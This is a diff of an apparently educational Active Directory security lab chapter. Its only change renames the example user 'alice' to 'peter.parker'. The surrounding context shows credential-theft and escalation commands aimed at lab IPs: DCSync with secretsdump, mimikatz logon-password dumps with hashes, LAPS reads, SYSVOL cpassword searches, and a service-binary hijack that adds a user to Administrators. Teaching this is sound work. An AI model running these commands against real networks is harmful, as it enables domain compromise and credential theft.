@@ -83,7 +83,7 @@ System (PID 4)                                Integrity: System
     winlogon.exe (session 1)                   System
       LogonUI.exe                              System
       userinit.exe -> spawns ->                User (Medium)
-        explorer.exe (alice's desktop)         Medium
+        explorer.exe (peter.parker's desktop)         Medium
           powershell.exe                       Medium  (or High after UAC consent)
           cmd.exe                              Medium
 ```
@@ -157,7 +157,7 @@ The 3 sub-authorities `21-x-y-z` identify the *issuing authority* (a domain or a
 
 ### Domain-specific well-known RIDs
 
-The final RID is what differentiates "Administrator" from "alice." A few are reserved:
+The final RID is what differentiates "Administrator" from "peter.parker." A few are reserved:
 
 | RID | Principal |
 |---|---|
@@ -192,7 +192,7 @@ The final RID is what differentiates "Administrator" from "alice." A few are res
 ### Tools
 
 ```
-PS> $sid = (New-Object System.Security.Principal.NTAccount('CORP','alice')).Translate([System.Security.Principal.SecurityIdentifier])
+PS> $sid = (New-Object System.Security.Principal.NTAccount('CORP','peter.parker')).Translate([System.Security.Principal.SecurityIdentifier])
 PS> $sid.Value
 S-1-5-21-1234567890-1234567890-1234567890-1109
 
@@ -203,7 +203,7 @@ PS> ([System.Security.Principal.SecurityIdentifier]'S-1-5-21-1234567890-12345678
 From Linux:
 
 ```bash
-impacket-lookupsid corp.local/alice:'DVADlab2024!'@10.10.0.10
+impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
 # enumerates RIDs 500-1500 via MS-LSAT LsarLookupSids
 ```
 
@@ -312,7 +312,7 @@ Every securable Windows object (file, registry key, named pipe, process, thread,
 |   Group SID (rarely used)                        |
 |   DACL (Discretionary ACL)                       |
 |     ACE 0  Allow Domain Users Read              |
-|     ACE 1  Allow corp\alice GenericAll          |
+|     ACE 1  Allow corp\peter.parker GenericAll          |
 |     ACE 2  Deny corp\guest Read                 |
 |   SACL (System ACL)                              |
 |     ACE 0  Audit Success+Failure Write Everyone |
@@ -448,7 +448,7 @@ HKEY_LOCAL_MACHINE   (HKLM)
 
 HKEY_USERS           (HKU)
     .DEFAULT\        new-user template
-    S-1-5-21-...-1109\   alice's hive, mounted while alice logged in
+    S-1-5-21-...-1109\   peter.parker's hive, mounted while peter.parker logged in
     S-1-5-21-...-1109_Classes\
     S-1-5-18\        SYSTEM's HKU hive
 
@@ -582,7 +582,7 @@ Microsoft LAPS (now "Windows LAPS" since 2023) randomises local admin passwords 
 If you can read `ms-MCS-AdmPwd` on a computer object → you have its local admin password. DVAD seeds a misconfigured LAPS ACL on at least one OU; that's CRED-019.
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
 ```
 
 ---
@@ -605,8 +605,8 @@ NTDS.dit is an **ESE (Extensible Storage Engine)** database — same engine used
 Every directory object is a row in `datatable`, attributed by columns. A user has columns including:
 
 - `samAccountName` (downlevel name)
-- `userPrincipalName` (UPN: `alice@corp.local`)
-- `cn` (CN: `Alice Smith`)
+- `userPrincipalName` (UPN: `peter.parker@corp.local`)
+- `cn` (CN: `peter.parker Smith`)
 - `objectSid`
 - `objectGUID`
 - `unicodePwd` — encrypted NT hash
@@ -635,7 +635,7 @@ You do not unroll this by hand. `secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
 1. **DCSync** — MS-DRSR `DRSGetNCChanges` RPC. Requires `Replicating Directory Changes`/`...-All` extended rights. Targets the DC over RPC over SMB or TCP/135.
    ```bash
-   impacket-secretsdump -just-dc corp.local/sync_user:'…'@10.10.0.10
+   impacket-secretsdump -just-dc corp.local/doctor.strange:'…'@10.10.0.10
    ```
 2. **VSS + copy.** Snapshot C:, copy `ntds.dit` + `SYSTEM` hive, parse offline.
 3. **`ntdsutil ifm`** — Microsoft-blessed IFM backup:
@@ -645,7 +645,7 @@ You do not unroll this by hand. `secretsdump -ntds ntds.dit -system SYSTEM LOCAL
    Produces an Active Directory subfolder with `ntds.dit` and the registry subset needed.
 4. **Backup Operators direct read** — `robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit`.
 
-DVAD ships at least one of each path (DCSync via `sync_user`, IFM via a Server Operators member, robocopy via Backup Operators) — read CRED-007/CRED-013/CRED-014 in PLAN.md.
+DVAD ships at least one of each path (DCSync via `doctor.strange`, IFM via a Server Operators member, robocopy via Backup Operators) — read CRED-007/CRED-013/CRED-014 in PLAN.md.
 
 ---
 
@@ -669,24 +669,24 @@ mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 1234567 (00000000:0012d687)
 Session           : Interactive from 1
-User Name         : alice
+User Name         : peter.parker
 Domain            : CORP
 Logon Server      : DC01
 Logon Time        : 2026-05-21 09:12:33
 SID               : S-1-5-21-1234567890-1234567890-1234567890-1109
         msv :
          [00000003] Primary
-         * Username : alice
+         * Username : peter.parker
          * Domain   : CORP
          * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
          * SHA1     : ...
         tspkg :
         wdigest :
-         * Username : alice
+         * Username : peter.parker
          * Domain   : CORP
          * Password : (null)         <-- empty because WDigest not enabled
         kerberos :
-         * Username : alice
+         * Username : peter.parker
          * Domain   : CORP.LOCAL
          * Password : (null)
 ```
@@ -974,9 +974,9 @@ We'll come back to detection writing in Chapter 13.
 
 ```bash
 # Grep SYSVOL for cpassword (mounted via SMB)
-smbclient.py corp.local/alice:DVADlab2024@10.10.0.10 \\SYSVOL
+smbclient.py corp.local/peter.parker:DVADlab2024@10.10.0.10 \\SYSVOL
 # or mount over SMB and use ripgrep
-mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=alice,password='DVADlab2024!'
+mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!'
 rg -i cpassword /mnt/sysvol/
 ```
 
@@ -1203,12 +1203,12 @@ DVAD doesn't enforce AppLocker/WDAC. The "LoLBin" category still matters for *ev
 
 To anchor everything, here's a worked microexample tying these pieces together. (You'll do the full one in lab 11.A.)
 
-**Goal:** as `alice` (a Domain User) with WinRM access to `file01`, escalate to SYSTEM on file01.
+**Goal:** as `peter.parker` (a Domain User) with WinRM access to `file01`, escalate to SYSTEM on file01.
 
-1. `alice` lands via WinRM. `whoami /priv` shows no privileges other than `SeChangeNotifyPrivilege`.
+1. `peter.parker` lands via WinRM. `whoami /priv` shows no privileges other than `SeChangeNotifyPrivilege`.
 2. Enumerate services: `Get-CimInstance Win32_Service | Where-Object StartMode -eq 'Auto'`. One service `BackupRunner` runs as SYSTEM with `PathName` = `C:\Tools\backup.exe`.
 3. `icacls C:\Tools\backup.exe` shows `BUILTIN\Users:(M)` — modify rights. Score.
-4. Replace `backup.exe` with a copy that calls `net localgroup Administrators alice /add`.
+4. Replace `backup.exe` with a copy that calls `net localgroup Administrators peter.parker /add`.
 5. Restart the service: `Restart-Service BackupRunner`.
 6. `whoami /groups` now includes `BUILTIN\Administrators`. Logout/login or grab a new WinRM session.
 7. As local admin, `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, exfil, `secretsdump LOCAL` — local NT hashes.
@@ -1220,12 +1220,12 @@ That chain touched: tokens (1), privileges (2), services (3, 5), ACLs (3), the S
 
 ## Lab exercises
 
-> **Prereq:** You have credentials for `alice` (Domain User). Compromise enough to drop into a shell on `ws01.corp.local` (10.10.0.100) or `file01` (10.10.0.13). Easiest path:
+> **Prereq:** You have credentials for `peter.parker` (Domain User). Compromise enough to drop into a shell on `ws01.corp.local` (10.10.0.100) or `file01` (10.10.0.13). Easiest path:
 >
 > ```bash
-> evil-winrm -i 10.10.0.100 -u alice -p 'DVADlab2024!'
+> evil-winrm -i 10.10.0.100 -u peter.parker -p 'DVADlab2024!'
 > # if access denied on ws01:
-> evil-winrm -i 10.10.0.13 -u alice -p 'DVADlab2024!'
+> evil-winrm -i 10.10.0.13 -u peter.parker -p 'DVADlab2024!'
 > ```
 
 ### Exercise 2.A — Walk your token
@@ -1287,7 +1287,7 @@ You should see a line ending in `:c5a237b7e9d8e708d8436b6148a25fa1:::` (or simil
         try {
             $acl = Get-Acl $path -ErrorAction Stop
             foreach ($ace in $acl.Access) {
-                if ($ace.IdentityReference -match 'Users|alice|Everyone' -and $ace.FileSystemRights -match 'Write|Modify|FullControl') {
+                if ($ace.IdentityReference -match 'Users|peter.parker|Everyone' -and $ace.FileSystemRights -match 'Write|Modify|FullControl') {
                     "$($s.Name) :: $path :: $($ace.IdentityReference) :: $($ace.FileSystemRights)"
                 }
             }
@@ -1314,14 +1314,14 @@ From a Kali pivot or with credentials:
 
 ```bash
 mkdir -p /mnt/sysvol
-mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=alice,password='DVADlab2024!',vers=3.0
+mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!',vers=3.0
 grep -ri "cpassword" /mnt/sysvol/ 2>/dev/null | head
 ```
 
 Or fully via SMB:
 
 ```bash
-impacket-smbclient.py corp.local/alice:'DVADlab2024!'@10.10.0.10
+impacket-smbclient.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
 use SYSVOL
 recurse on
 ls
